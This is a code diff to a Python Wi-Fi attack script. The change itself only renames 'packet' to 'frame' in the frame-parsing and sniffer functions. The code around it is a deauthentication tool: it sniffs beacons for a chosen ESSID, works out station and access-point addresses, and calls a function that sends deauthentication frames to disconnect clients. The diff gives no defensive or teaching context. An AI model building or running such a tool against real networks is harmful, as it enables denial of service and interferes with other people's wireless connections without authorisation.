@@ -50,23 +50,23 @@ def is_unicast(bssid):
         raise MsgException(e, 'BSSID could not be processed')
     return unicast
 
-def get_src_dst_network(packet):
+def get_src_dst_network(frame):
     '''frame control field parsing'''
     
     try:
-        if packet.FCfield & 0x1:
-            if not (packet.FCfield & 0x2):
-                bssid_src = packet.addr2
-                bssid_dst = packet.addr3
-                bssid_network = packet.addr1
+        if frame.FCfield & 0x1:
+            if not (frame.FCfield & 0x2):
+                bssid_src = frame.addr2
+                bssid_dst = frame.addr3
+                bssid_network = frame.addr1
         else:
-            bssid_dst = packet.addr1
-            if packet.FCfield & 0x2:
-                bssid_src = packet.addr3
-                bssid_network = packet.addr2
+            bssid_dst = frame.addr1
+            if frame.FCfield & 0x2:
+                bssid_src = frame.addr3
+                bssid_network = frame.addr2
             else:
-                bssid_src = packet.addr2
-                bssid_network = packet.addr3
+                bssid_src = frame.addr2
+                bssid_network = frame.addr3
     except Exception as e:
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
@@ -95,16 +95,16 @@ def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network):
         raise MsgException(e, 'Deauthentication frames could not be sent')
 
 def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dict):
-    def sniffer_handler(packet):
-        '''sniffed packet processing'''
+    def sniffer_handler(frame):
+        '''sniffed frame processing'''
         
         try:
-            bssid_src, bssid_dst, bssid_network = get_src_dst_network(packet)
+            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
             if bssid_src and bssid_dst and bssid_network:
                 
-                if packet.haslayer(dot11.Dot11Beacon): # wlan type mgt subtype beacon
+                if frame.haslayer(dot11.Dot11Beacon): # wlan type mgt subtype beacon
                     if not bssids_aps_dict.get(bssid_src):
-                        dot11_element = packet.getlayer(dot11.Dot11Elt)
+                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                         while dot11_element:
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
@@ -131,7 +131,7 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dic
                                 f'\n    access point = {bssid_dst}')
                             unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
         except Exception as e:
-            raise MsgException(e, 'Sniffed packets could not be processed')
+            raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
 
 def main():
